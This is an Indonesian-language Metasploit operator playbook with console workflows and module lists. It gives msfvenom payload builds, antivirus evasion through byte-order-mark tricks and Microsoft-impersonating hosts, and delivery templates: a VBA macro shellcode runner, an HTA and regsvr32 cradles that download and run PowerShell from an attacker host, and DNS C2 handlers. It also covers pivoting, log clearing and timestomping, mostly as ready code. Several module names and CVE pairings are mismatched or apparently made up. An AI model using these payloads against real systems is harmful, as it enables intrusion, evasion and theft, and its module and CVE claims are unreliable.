# w2-msf-gamebook — malware

# Metasploit Gamebook: Console-to-Exploit Workflow

## 1. Workflow Kanonik (msfconsole → session)

| Fase | Perintah | Output yang Diharapkan |
|---|---|---|
| Inisialisasi | `msfconsole -q -n` | prompt `msf6 >` (tanpa banner, tanpa DB) |
| DB init | `msfdb init && msfdb start` | `[*] Starting database` → `msf6 >` |
| Workspace | `workspace -a <op>` | `[*] Added workspace` |
| Cari modul | `search type:exploit platform:windows cve:2024-` | tabel modul + rank |
| Seleksi | `use exploit/windows/smb/ms17_010_eternalblue` | prompt `msf6 exploit(...) >` |
| Recon | `show options; show payloads; show targets` | daftar RHOSTS/LHOST/dll |
| Set target | `set RHOSTS 10.10.10.0/24; set THREADS 8` | `RHOSTS => ...` |
| Set payload | `set PAYLOAD windows/x64/meterpreter/reverse_tcp` | `PAYLOAD => ...` |
| Set handler | `set LHOST 10.10.14.5; set LPORT 4444` | `LHOST => ...` |
| Cek | `check` | `[+] 10.10.10.7:445 - The target is vulnerable.` |
| Opsi tuner | `setg VERBOSE true; setg ExitOnSession false` | global var |
| Run | `run -j -z` | `[*] Exploit running as background job 0` |
| Handler siap | (otomatis jika `run`) | `[*] Started reverse TCP handler on 10.10.14.5:4444` |
| Session | `sessions -i 1` | `meterpreter >` |
| Persist di console | `background` | `msf6 >` |

Automasi batch:
```bash
msfconsole -q -x "use exploit/multi/handler; \
set PAYLOAD windows/x64/meterpreter/reverse_https; \
set LHOST 10.10.14.5; set LPORT 443; \
set ExitOnSession false; \
set AutoRunScript post/multi/manage/sysinfo; \
run -j"
```

`.rc` non-interaktif:
```
use auxiliary/scanner/smb/smb_version
set RHOSTS file:/tmp/targets.txt
set THREADS 16
run
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false
set AutoRunScript multi_console_command -rc /tmp/post.rc
run -j
```
Eksekusi: `msfconsole -q -r scan.rc`

---

## 2. Modul Eksploitasi Relevan (2026)

### Windows (Win10 22H2 / Win11 23H2–24H2 / Server 2019–2025)

| Modul | CVE / Vektor | Target konkret | Catatan |
|---|---|---|---|
| `exploit/windows/smb/ms17_010_eternalblue` | CVE-2017-0144 | Server 2008/2012, Win7/8.1 (unpatched MS17-010) | Staged `windows/x64/meterpreter/reverse_tcp` wajib x64; gagal di Win11 (patched) |
| `exploit/windows/smb/ms17_010_psexec` | MS17-010 | 2008 R2 | Lebih stabil dari eternalblue untuk shell |
| `exploit/windows/local/ms16_032_secondary_logon_handle_privesc` | CVE-2016-032 | Win10 ≤1607 | Lokal; butuh session awal |
| `exploit/windows/local/cve_2023_21768_afd_arb_rw` | CVE-2023-21768 | Win11 22H2 pre-patch | Butuh session user |
| `exploit/windows/local/cve_2024_30088_ani` | CVE-2024-30088 | Win11 23H2/24H2 pre-Juni 2024 | LPE token stealing |
| `exploit/windows/smb/cve_2020_1472_smbghost` | CVE-2020-0796 | Win10 1903/1909, Server 1903 | Crash risk; pakai `check` dulu |
| `exploit/windows/http/exchange_proxyshell_rce` | CVE-2021-34473 | Exchange 2013/2016/2019 | Post-auth chain; OWA 443 |
| `exploit/windows/http/exchange_proxynotshell_rce` | CVE-2021-26855+ | Exchange 2019 | Patched awal 2021 |
| `exploit/windows/http/exchange_proxylogon_rce` | CVE-2021-26855 | Exchange 2013–2019 pre-Maret 2021 | ECP path target |
| `exploit/windows/http/sharepoint_ssrf_cve_2023_24955` | CVE-2023-24955 | SharePoint 2019/SE | RCE via ViewState |
| `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` | CVE-2019-0708 | Win7/2008 R2 | Win10/2019 tidak terpengaruh; BSOD sering |
| `exploit/windows/smb/psexec` | — (admin creds) | Semua Windows dengan admin cred | Paling reliabel untuk lateral |
| `exploit/windows/misc/hta_server` | — | Semua Windows | Phishing/delivery HTA |
| `exploit/windows/misc/regsvr32_applocker_bypass_server` | — | Win10/11 | SCTL delivery |
| `exploit/multi/script/web_delivery` | — | Semua | Cradle PowerShell/Python/Regsvr32 |
| `exploit/windows/smb/smb_delivery` | — | Semua | SMB-hosted payload (.dll/.lnk) |

### Linux (kernel 5.x–6.x, Ubuntu 20.04–24.04, RHEL 8/9, Debian 11/12)

| Modul | CVE / Vektor | Target | Catatan |
|---|---|---|---|
| `exploit/linux/http/apache_normalize_path_rce` | CVE-2021-41773/42013 | Apache 2.4.49/2.4.50 | Path traversal → RCE via CGI |
| `exploit/linux/http/apache_ofbiz_rce` | OFBiz CVE-2023-51467 | Apache OFBiz ≤18.12.11 | RCE pre-auth |
| `exploit/linux/http/spring_cloud_gateway_rce` | CVE-2022-22947 | Spring Cloud Gateway <3.1.1 | Actuator RCE |
| `exploit/multi/http/spring_framework_rce_spring4shell` | CVE-2022-22965 | Spring 5.3.0–5.3.17 (JDK≤8) | Tomcat WAR drop |
| `exploit/linux/http/log4shell_header_injection` | CVE-2021-44228 | App pakai log4j 2.0–2.14 | LDAP callback ke `marshalsec`/JNDIExploit |
| `exploit/multi/http/log4shell_header_injection` | — | Generic header | Sama |
| `exploit/linux/http/confluence_widget_connector_rce` | CVE-2023-22527 | Confluence DC/Server <8.5.4 | Template injection |
| `exploit/multi/http/atlassian_confluence_ognl_injection` | CVE-2023-22515+22518 | Confluence 8.0–8.5 | Pre-auth admin create |
| `exploit/linux/http/gitea_argocd_lfi_cve_2022_21773` | CVE-2022-21773 | ArgoCD <2.3.0 | Baseline |
| `exploit/linux/http/redis_desync_rce` | — | Redis tanpa auth | Master-slave module load |
| `exploit/linux/http/redis_server_redis_ext` | — | Redis 5/6/7 | Rogue module |
| `exploit/linux/local/overlayfs_priv_esc` | CVE-2021-3493/2023-0386 | Ubuntu ≤20.04, kernel ≤5.15 | LPE |
| `exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec` | CVE-2021-4034 | RHEL/Ubuntu/Debian dengan `pkexec` | Universal LPE |
| `exploit/linux/local/netfilter_nft_set_elem_init` | CVE-2022-32250 | kernel 5.18 | LPE reliable |
| `exploit/linux/local/network_manager_vpnc_username_injection` | CVE-2018-10900 | NetworkManager | Legacy |
| `exploit/linux/ssh/ssh_login` (aux) | Creds | Semua SSHD | default creds brute |
| `exploit/linux/local/cve_2023_2284_netfilter` | CVE-2023-2284 | kernel ≤6.2 | LPE |

### Web / Jenkins / Confluence / AtScale

| Modul | CVE | Produk & Versi | Delivery |
|---|---|---|---|
| `exploit/multi/http/jenkins_script_console` | — | Jenkins (auth creds) | Groovy script → `executeCommand` |
| `exploit/multi/http/jenkins_cli_deserialization` | CVE-2017-1000353 | Jenkins ≤2.56 | CLI serialization |
| `exploit/multi/http/jenkins_metaprogramming` | — | Jenkins pre-2.x post-auth | Groovy metaprogramming |
| `exploit/multi/http/atlassian_confluence_namespace_ognl_injection` | CVE-2023-22527 | Confluence 8.0–8.5.3 | OGNL namespace |
| `exploit/multi/http/atlassian_confluence_ognl_injection` | CVE-2023-22515 | Confluence DC | Admin creation |
| `exploit/multi/http/atlassian_bitbucket_rce_cve_2022_26190` | CVE-2022-26190 | Bitbucket 7.0–7.21 | Git exec |
| `exploit/multi/http/gitea_argocd_rce` | CVE-2022-21773 | Gitea | Repo cloning |
| `exploit/multi/http/gitlab_github_repo_import_rce` | CVE-2023-2825 | GitLab 16.0 | Import tar |
| `exploit/multi/http/nginx_alias_traversal` | CVE-2021-23017 / misconfig | nginx 1.25 alias off-by-slash | LFI/upload |
| `exploit/multi/http/apache_httpd_mod_proxy` | CVE-2021-40438 | httpd 2.4.48 | SSRF→RCE |
| `exploit/multi/http/tomcat_mgr_upload` | — | Tomcat 8/9/10 dengan mgr | WAR deploy |
| `exploit/multi/http/tomcat_mgr_deploy` | — | Tomcat 6/7/8 | WAR deploy |
| `exploit/multi/http/php_cgi_arg_injection` | CVE-2012-1823 | PHP-CGI 5.x–2024 | QUERY string args |
| `exploit/multi/http/atlassian_jira_unauthenticated_template_injection` | CVE-2019-11581 | Jira 7/8 | Template inj |

### Payload Tier

| Arsitektur | Staged | Stageless | Catatan |
|---|---|---|---|
| x64 | `windows/x64/meterpreter/reverse_tcp` (~200 KB staging flow) | `windows/x64/meterpreter_reverse_tcp` (~10–20 MB exe / ~8KB shellcode via shellcode) | Staged butuh stager; deteksi AV pada stager |
| x86 | `windows/meterpreter/reverse_tcp` | `windows/meterpreter_reverse_tcp` | Win10/11 x64 wajib x64 |
| Linux | `linux/x64/meterpreter/reverse_tcp` | `linux/x64/meterpreter_reverse_tcp` | Staged butuh writable temp |
| Shell | `windows/x64/shell_reverse_tcp` | — | Ringan |
| Cmd | `cmd/windows/powershell_reverse_tcp` | — | PowerShell cradle |
| HTTPS | *.reverse_https | *.meterpreter_reverse_https | Egress 443 |
| Named pipe | `windows/x64/meterpreter/reverse_named_pipe` | — | Lateral lokal |
| IPv6 | `windows/x64/meterpreter/reverse_ipv6_tcp` | — | Rare |
| Bind | `windows/x64/meterpreter/bind_tcp` | — | Firewall jalan |

---

## 3. Pemilihan Staged vs Stageless

| Kondisi | Pilih | Alasan |
|---|---|---|
| Tahap init berjalan (< 500 KB di memori) | Staged (`reverse_tcp`) | Footprint kecil, cepat |
| Stager terhalang AV (biasanya `windows/x64/meterpreter/reverse_tcp` dideteksi) | Stageless (`meterpreter_reverse_tcp`) | Shellcode + DLL dalam satu blob |
| Buffer overflow terbatas (≤ 400 byte) | Staged minimal (`shell/reverse_tcp`) | Stager manual, payload kecil |
| Target di segmen restrictif dengan DPI | Stageless + HTTPS | TLS full dalam satu blob, tidak ada callback kedua |
| Persistence via file drop | Stageless (EXE besar) | Self-contained |
| Lateral via PsExec admin creds | `windows/smb/psexec` + staged service exe | Automatis pakai service exe built-in |
| Perimeter tanpa outbound kecuali DNS | `meterpreter/reverse_dns` staged | DNS tunnel |

Contoh build stageless manual:
```bash
msfvenom -p windows/x64/meterpreter_reverse_https \
  LHOST=10.10.14.5 LPORT=443 \
  EXITFUNC=thread PrependMigrate=true PrependMigrateProc=explorer.exe \
  -f exe -o m64.exe
# shellcode saja
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.14.5 LPORT=443 \
  -f raw -o m64.bin
```

Staged dengan tuning:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=10.10.14.5 LPORT=443 \
  HttpHostHeader=cdn.microsoft.com \
  HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" \
  HandlerSSLCert=/tmp/le.pfx StagerRetryCount=10 StagerRetryWait=5 \
  EXITFUNC=thread -f exe -o s64.exe
```

---

## 4. Evasion Layer

### Handler Side
```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
set EXITFUNC thread            # payload keluar tanpa terminate parent
set ExitOnSession false
set StagerRetryCount 30
set SessionCommunicationTimeout 300
set SessionExpirationTimeout 604800
set ReverseAllowProxy true
set HandlerSSLCert /tmp/le.crt
set HttpHostHeader www.microsoft.com
set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0.0.0"
set ReverseListenerThreads 4
run -j
```

### `set EXITFUNC`
| Nilai | Efek | Kapan |
|---|---|---|
| `thread` | Terminate hanya thread payload; proses host hidup | Disarankan untuk injection |
| `process` | Terminate proses host (`explorer.exe` mati biasanya crash) | Hindari |
| `seh` | Unwind via SEH | Untuk binary fragile |
| `none` | No cleanup (leak thread) | Debug only |

### ANSI BOM bypass (Windows Script Host / PowerShell)
File `.vbs`/`.js`/`.hta`/`.ps1` dengan BOM UTF-16LE atau UTF-8-with-BOM diparse WSH berbeda — sering melewati rule berbasis sig AV.

```bash
# payload script mentah
printf 'CreateObject("WScript.Shell").Run "powershell -w hidden -nop -c ""IEX(New-Object Net.WebClient).DownloadString(\x27http://10.10.14.5/a.ps1\x27)""",0\r\n' > m.vbs

# prepend BOM UTF-16LE
printf '\xff\xfe' | cat - m.vbs > m_bom.vbs

# atau UTF-8 BOM
printf '\xef\xbb\xbf' | cat - m.vbs > m_utf8.vbs
```

HTA dengan BOM:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 \
  -f hta-psh -o m.hta
printf '\xef\xbb\xbf' | cat - m.hta > m_bom.hta
```

### NoRateLimit (for exploit delivery throttle)
Tools eksternal `NoRateLimit` bukan modul MSF; di sisi handler gunakan throttle:
```bash
set THREADS 1
set ConnectTimeout 5
set WfsDelay 3
set Triggers 1
```
Untuk modul auxiliary scanning:
```
set BRUTEFORCE_SPEED 1        # login scanner
set STOP_ON_SUCCESS true
set THREADS 2
```
MSF sendiri tidak memiliki `NoRateLimit`; gunakan downtime scheduling via `sleep`/`spool` di `.rc`:
```
<ruby>
rhosts.each do |r|
  run_single("set RHOSTS #{r}")
  run_single("run")
  sleep(30)
end
</ruby>
```

### Session Hardening Post-Exploit
```bash
migrate -N explorer.exe
sessions -i 1
# atau background migration
sessions -c "getsystem" -i 1
sessions -c "run post/windows/manage/migrate" -i 1
```
```bash
# matikan komunikasi plaintext
meterpreter > setg SessionTlvLogging true
meterpreter > transport add -t reverse_https -l 10.10.14.5 -p 8443 -i 1
```
```bash
# kill stager artifacts
meterpreter > clearev      # hati-hati; forensik tidak berbalik
meterpreter > timestomp -v C:\\Windows\\Temp\\s64.exe C:\\Windows\\System32\\svchost.exe
```

---

## 5. Template Delivery Persis

### 5.1 Macro Office (Word/Excel) — VBA
```vba
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwStackSize As Long, ByVal lpThreadAttributes As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
Sub AutoOpen()
  Dim b() As Byte
  b = GetPayload()
  Call CreateThread(VarPtr(b(0)), 0&, 0&, 0&, 0&, 0&)
End Sub
Function GetPayload() As Byte()
  Dim s As String, i As Long, o() As Byte
  s = "SHELLCODE_HEX_HERE"   ' x64 shellcode dari msfvenom -f hex
  ReDim o(Len(s) \ 2 - 1) As Byte
  For i = 0 To Len(s) \ 2 - 1
    o(i) = CLng("&H" & Mid(s, i * 2 + 1, 2))
  Next i
  GetPayload = o
End Function
```
Build:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 \
  EXITFUNC=thread -f hex -o shellcode.hex
# paste isi shellcode.hex ke "SHELLCODE_HEX_HERE"
```
Kirim: `.docm`. Muncul: spawn `WINWORD.EXE` → thread baru → callback TLS 443. Gagal jika AMSI aktif + Defender cloud-delivered; macro execution policy "Disable all macros without notification" mematikan `AutoOpen`.

### 5.2 HTA (Mshta) — SharpShooter-style logic
```html
<html>
<head>
<script language="VBScript">
  Sub Window_OnLoad
    Dim sh : Set sh = CreateObject("WScript.Shell")
    sh.Run "powershell -w hidden -nop -ep bypass -c ""IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/a.ps1')""",0,False
    window.close
  End Sub
</script>
</head>
<body> Loading... </body>
</html>
```
Build MSF-native:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 \
  -f hta-psh -o m.hta
python3 -c "d=open('m.hta','rb').read();open('m_bom.hta','wb').write(b'\xef\xbb\xbf'+d)"
```
Delivery:
```
mshta http://10.10.14.5:8080/m_bom.hta
mshta "javascript:code=(new ActiveXObject('WScript.Shell')).Run('calc',0);close()"
```
Server cepat: `python3 -m http.server 8080` atau `use exploit/windows/misc/hta_server`.

### 5.3 Script Delivery (PowerShell cradle via Unicorn-like)
MSF-native `web_delivery`:
```bash
use exploit/multi/script/web_delivery
set target 2                # PowerShell
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 10.10.14.5
set LPORT 443
set URIPATH /u
set SRVPORT 8080
run -j
```
Output di console = one-liner persis untuk diumpankan ke target:
```
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7AC...
```
Ubah ke `-EncodedCommand` UTF-16LE untuk mem-bypass parsing:
```bash
python3 -c "import base64; s=open('cmd.txt','rb').read(); print(base64.b64encode(s.decode('utf-16le').encode('utf-8')).decode())"
```

Regsvr32 AppLocker bypass delivery:
```bash
use exploit/windows/misc/regsvr32_applocker_bypass_server
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 10.10.14.5
set LPORT 443
set URIPATH /x.sct
set SRVHOST 10.10.14.5
run
```
One-liner di target:
```
regsvr32 /s /n /u /i:http://10.10.14.5:8080/x.sct scrobj.dll
```

### 5.4 LNK/CHM/ISO
```bash
# LNK via smb_delivery
use exploit/windows/smb/smb_delivery
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set SRVHOST 10.10.14.5
set SRVPORT 445
run
```
Output: `\\10.10.14.5\WgFy\...` share path + `.lnk` yang mengeksekusi `rundll32`.

CHM:
```bash
# nirsoft 7z + msfvenom -> chm
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o a.exe
# bungkus menjadi .chm dengan HH.exe dan shortCut command
```
Saat dibuka via `hh.exe file.chm`, spawn child proses; terdeteksi Defender jika `.chm` unpack berisi `.exe` tidak ditandatangani.

---

## 6. Multi-Handler, Pivot, Jump

### Multi-Handler (3 egress alternatif)
```bash
# Handler 1 — 443 HTTPS
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 10.10.14.5
set LPORT 443
set ExitOnSession false
set HandlerSSLCert /tmp/le.pfx
run -j -z

# Handler 2 — 8080 HTTP (fallback bila TLS diblokir)
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 8080
set ExitOnSession false
run -j -z

# Handler 3 — 53 DNS tunnel
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_dns
set LHOST 10.10.14.5
set LPORT 53
set DOMAIN evil.c2.tld
set ExitOnSession false
run -j -z
```
Fronting 443 dengan nginx 1.25 reverse proxy TLS terminator:
```nginx
server {
  listen 443 ssl http2;
  server_name cdn.microsoft.com;
  ssl_certificate     /etc/le/fullchain.pem;
  ssl_certificate_key /etc/le/privkey.pem;
  ssl_protocols       TLSv1.2 TLSv1.3;
  location /updates/ {
    proxy_pass       http://127.0.0.1:8443;
    proxy_set_header Host $host;
    proxy_set_header X-Forwarded-For $remote_addr;
  }
  location / { return 302 https://www.microsoft.com; }
}
```
Pada handler MSF: `set LPORT 8443`, `set HttpHostHeader cdn.microsoft.com`, ST port forward dari 443→8443 di firewall.

### Jump / Pivot chain
```bash
# Session 1 (edge) — tambah route
msf6 > use post/multi/manage/autoroute
msf6 post(...) > set SESSION 1
msf6 post(...) > set SUBNET 10.0.0.0
msf6 post(...) > set NETMASK 255.0.0.0
msf6 post(...) > run

# alternatif manual di meterpreter
meterpreter > run autoroute -s 10.0.1.0/24 -p 10.0.0.5
meterpreter > portfwd add -L 0.0.0.0 -l 3389 -r 10.0.1.10 -p 3389

# SOCKS proxy via MSF
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(...) > set SRVPORT 1080
msf6 auxiliary(...) > set VERSION 5
msf6 auxiliary(...) > set SRVHOST 127.0.0.1
msf6 auxiliary(...) > run -j
# cli tool pakai proxychains4 dengan socks5 127.0.0.1:1080
proxychains4 -q nmap -Pn -sT -p445 10.0.1.0/24
```
Pivot via Meterpreter `route`:
```
meterpreter > run autoroute -s 10.0.1.0/24
```
Atau langsung di console: `route add 10.0.1.0 255.255.255.0 1`.

Nested handler untuk second stage:
```bash
# di session 1
meterpreter > portfwd add -L 0.0.0.0 -l 9001 -r 10.0.1.10 -p 9001

# di msf console
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5    # setelah forward
set LPORT 9001
set ExitOnSession false
set ReverseAllowProxy true
run -j
```
Untuk dua jump berlapis pakai `socks_proxy` + `Autoroute` di session 2 (autoroute sniff subnet baru).

C2-relay via SSH SOCKS (jika Meterpreter SOCKS tidak tersedia):
```bash
ssh -D 1080 -N -f pivot@pivot-host
```

Memindahkan session lewat `transport`:
```
meterpreter > transport add -t reverse_https -l 10.10.14.5 -p 8443 -i 1
meterpreter > transport next
meterpreter > transport list
```

---

## 7. Jebakan Operasional di Lapangan

| Jebakan | Gejala | Mitigasi |
|---|---|---|
| **Staged payload di segmen DPI dengan egress filter 1-koneksi** | Stager reach, session drop sebelum Meterpreter penuh | Ganti ke stageless (`meterpreter_reverse_https`) single-blob |
| **`windows/x64/meterpreter/reverse_tcp` dideteksi Defender 2024/2025** | Sesaat setelah `run`, `[!] Handler timeout`; tak ada callback | Stageless + `HttpUserAgent` modern; atau `shell_reverse_https` manual cradle |
| **EternalBlue pada Win10/11** | BSOD 0x00000050 (PAGEFAULT), host hilang | `check` dulu; jangan target Win10 1903+ (patched) |
| **Reverse_https di 443 ditelan proxy korporat (TLS inspection)** | Session drop pasca-TLS, target `ERR_CERT` | Pakai `HandlerSSLCert` dengan cert perusahaan (kalau ada) atau `ReverseAllowProxy` |
| **`HandlerSSLCert` lupa `set` sebelum `run`** | Sertifikat default MSF (self-signed) → alert | Set sebelum `run`; restart handler jika ubah |
| **BOM ANSI ditaruh pada file `.hta` yang dikirim via Teams/Slack** | File dibungkus jadi `.zip`/dipindai | Hanya `.hta/.vbs` mentah via web delivery; jangan attachment chat |
| **`EXITFUNC=process` di `explorer.exe`** | Explorer crash → telemetry EDR | Selalu `set EXITFUNC thread`; pada `msfvenom` sertakan `PrependMigrate` |
| **`migrate` dilupakan setelah `getsystem`** | Session mati saat user logout | `run post/windows/manage/migrate` sebelum `background` |
| **LPORT 443 bentrok dengan nginx 1.25 frontend** | Handler tidak bind (Address already in use) | nginx di 443, handler di 8443, iptables DNAT; atau `set SRVPORT` berbeda |
| **`web_delivery` URL di `-EncodedCommand` di-safe-mode PowerShell** | Target balik 403 / tidak ada eksekusi | Ubah ke `-Command "&{...}"` tanpa encoded; coba `regsvr32`/`mshta` |
| **Meterpreter `transport` gagal saat session ID stale** | `transport add` return error tapi session masih jalan | `sessions -i`, baca `sessions -l` sebelum transport |
| **`autoroute` di subnet /8 dengan `NETMASK 255.0.0.0`** | Scanning lambat, routing table membengkak | Pakai /16 atau daftar /24 spesifik, bukan /8 |
| **`socks_proxy` + `proxychains4` dengan DNS resolution** | Nmap hang di DNS queries | `proxychains4 -q` + `nmap -n -Pn -sT` |
| **Modul Confluence `cve_2023_22527` di Confluence Cloud** | `check` false, target 404 | Modul hanya untuk Server/DC; Cloud beda arsitektur |
| **`jenkins_script_console` di Jenkins 2.4xx+ dengan CSRF aktif** | 403 `Crumb` missing | Ambil `Jenkins-Crumb` dulu, atau pakai `jenkins_cli_deserialization` (versi lama) |
| **Exchange ProxyShell memakai staged payload ke `SystemMailbox`** | ProxyShell patched Feb–Apr 2021 → error 501/440 | Cek build Exchange dulu; `check` sebelum `run` |
| **`msfvenom -f hta-psh` di AV cloud 2025 dengan dynamic sandbox** | HTA terdeteksi saat runtime | Prepend BOM UTF-16LE + obfuscate `powershell` string; atau `mshta javascript:` inline |
| **`NoRateLimit` / throttle dikira modul MSF** | `use NoRateLimit` → error | Itu tool terpisah; gunakan `set THREADS 1`/`sleep` di `.rc` |
| **`ReverseAllowProxy true` di handler publik** | SSRF tidak sengaja dari luar | Hanya aktifkan di lingkungan lab / egress-restricted |
| **Sertifikat self-signed expired pada `HandlerSSLCert`** | Semua callback ditolak pre-handshake | Regenerasi cert sebelum operasi; monitor expiry |
| **`SessionCommunicationTimeout 300` + beacon lambat** | Session mati walau

## [lanjutan]

# Referensi Lanjutan Metasploit — Bagian 2

## Workflow Script Console-to-Exploit (lanjutan: post-check, upgrade, cleanup)

Alur kerja konsol yang belum dibahas: dari sesi `msfconsole` mentah sampai skrip reproducible yang bisa di-`resource`. Fokus bagian ini pada **idempotensi**, **rollback**, dan **deteksi kegagalan dini**.

```ruby
# /tmp/op.rc — workflow lengkap, dipanggil: msfconsole -q -r /tmp/op.rc
<ruby>
log = File.open("/tmp/op_#{Time.now.to_i}.log","w")
target = ENV['TGT'] || raise("set TGT=<ip>")
lhost  = ENV['LHOST'] || '10.10.14.5'
rport  = (ENV['RPORT'] || '445').to_i
mod    = ENV['MOD'] || 'exploit/windows/smb/ms17_010_eternalblue'

run_single("use #{mod}")
run_single("set RHOSTS #{target}")
run_single("set RPORT #{rport}")
run_single("set LHOST #{lhost}")
run_single("set LPORT 4444")
run_single("set PAYLOAD windows/x64/meterpreter/reverse_tcp")
run_single("set ExitOnSession false")
run_single("set VERBOSE false")
run_single("check")                       # banyak modul mendukung CHECK
r = framework.sessions.length
run_single("exploit -j -z")               # -j jobs, -z jangan interactive
sleep 15
if framework.sessions.length > r
  framework.sessions.each_key do |sid|
    s = framework.sessions[sid]
    next unless s.respond_to?(:sysinfo)
    puts "[+] session #{sid}: #{s.sysinfo['Computer']} #{s.sysinfo['OS']}"
    run_single("sessions -C 'getuid;sysinfo;getsystem' -i #{sid}") rescue nil
    log.puts "#{sid} ok"
  end
else
  puts "[!] no session — cek: setg EnableStageEncoding true, cek target/kill AV"
  log.puts "FAIL"
end
log.close
</ruby>
```

**Jebakan operasional:**
- `check` pada modul SMB/HTTP bisa **memutus** service yang sudah rapuh (terutama JBoss/Struts lama). Set `CheckModule=false` jika target sensitif.
- `exploit -z` tidak otomatis memberi sesi interaktif — kombinasi `-j -z` adalah default headless; `sessions -i` manual diperlukan untuk post.
- Modul dengan `AutoCheck` true kadang mengembalikan `The target is not exploitable` **padahal** vector masih valid (fingerprint gagal karena WAF/rewrite). Override dengan `set AutoCheck false` sebelum `exploit`.
- `set ExitOnSession false` **wajib** jika `-j`, kalau tidak `msfconsole` keluar setelah sesi pertama (di versi < 6.3 ini default-nya berbeda).

---

## Daftar Modul Eksploitasi Relevan 2026 per Platform (tambahan — di luar yang sudah dikutip)

### Windows Server 2019/2022 — SMB/AD/RPC

| Modul | CVE | Catatan 2026 |
|---|---|---|
| `exploit/windows/smb/cve_2023_36874_packet_printer` | CVE-2023-36874 | Butuh user lokal, privilege escalation Print Spooler; stabil di 2019, sering mati di 2022 patch Jan-2025 |
| `exploit/windows/local/cve_2024_26229_printer` | CVE-2024-26229 | LPE spooler baru; butuh service `Spooler` aktif |
| `exploit/windows/smb/ms17_010_eternalblue` | MS17-010 | Masih jalan di 2019 tidak-terpatching; **tidak** di 2022 (SMB dialect) |
| `auxiliary/scanner/smb/smb_ms17_010` | — | Check non-destruktif; aman dijalankan dulu |
| `exploit/windows/smb/ms17_010_psexec` | MS17-010 | Varian non-crash, lebih lambat; pilihan jika EB khawatir BSOD |
| `exploit/windows/smb/psexec` | — | Classic cred-based, butuh admin; `SMB::Auth=smbntlm` |
| `exploit/windows/local/cve_2023_21768_afd` | CVE-2023-21768 | LPE AFD.sys, 2022 s/d build 22621; butuh `SeImpersonate` |
| `exploit/windows/local/cve_2024_30088_afd` | CVE-2024-30088 | LPE AFD baru; **tidak** di Server 2025 |
| `exploit/windows/local/cve_2022_37966_wermgr` | CVE-2022-37966 | LPE wer; sering dipakai setelah phishing HTA |
| `exploit/windows/http/exchange_proxyshell_rce` | CVE-2021-34473/34523 | Exchange 2019; sering masih ada di lab internal |
| `exploit/windows/http/exchange_proxylogon_rce` | CVE-2021-26855 | Pre-auth SSRF; stabil |
| `exploit/windows/http/exchange_proxynotshell_rce` | CVE-2022-41040/41082 | PowerShell backend; `check` cepat |

### Linux — kernel & layanan terbaru

| Modul | CVE | Varian / target |
|---|---|---|
| `exploit/linux/local/cve_2023_32233_pwnkit` | PwnKit | Polkit `pkexec`; semua distro dengan polkit < 121; user shell apapun |
| `exploit/linux/local/cve_2022_0847_dirtypipe` | Dirty Pipe | 5.8–5.16.11; menimpa `/etc/passwd` atau SUID; gunakan `WRITEABLE` file sebagai vector |
| `exploit/linux/local/cve_2023_2284_netfilter` | nf_tables use-after-free | < 6.3.1; butuh unshare/namespaces; sering di container |
| `exploit/linux/local/cve_2024_1086_netfilter` | UAF nf_tables | 6.4–6.7; mitra dari modul 2284 |
| `exploit/linux/local/cve_2024_26976_apparmor` | AppArmor | 6.x kernels Ubuntu; bypass profile |
| `exploit/linux/local/cve_2023_0386_overlayfs` | OverlayFS | Ubuntu 22.04/20.04; `PRIV_ESC` via unshare |
| `exploit/linux/http/apache_ofbiz_rce` | CVE-2023-51467 | Ofbiz < 18.12.11; pre-auth |
| `exploit/linux/http/gitlab_graphql_auth_bypass` | CVE-2023-7028 | GitLab 16.x reset password takeover |
| `exploit/linux/http/confluence_ognl_injection` | CVE-2023-22527 | Confluence 8.x template injection; sering di lab |
| `exploit/linux/http/craftcms_rce` | CVE-2023-41892 | Craft CMS; unsigned RCE |
| `exploit/linux/http/geoserver_unauth_rce` | CVE-2024-36401 | GeoServer; `GetPropertyValue` OGNL |
| `exploit/linux/http/jenkins_cli_deserialization` | CVE-2024-23897 | Jenkins CLI read/exec via args4j; **tidak** pre-auth RCE |
| `exploit/multi/http/jenkins_script_console` | — | Butuh kredensial; `TARGETURI=/script` |
| `exploit/linux/http/redis_rce_unauth` | — | Via `SLAVEOF`/module load; butuh `protected-mode no` |

### Web / enterprise apps (varian teknik & edge case)

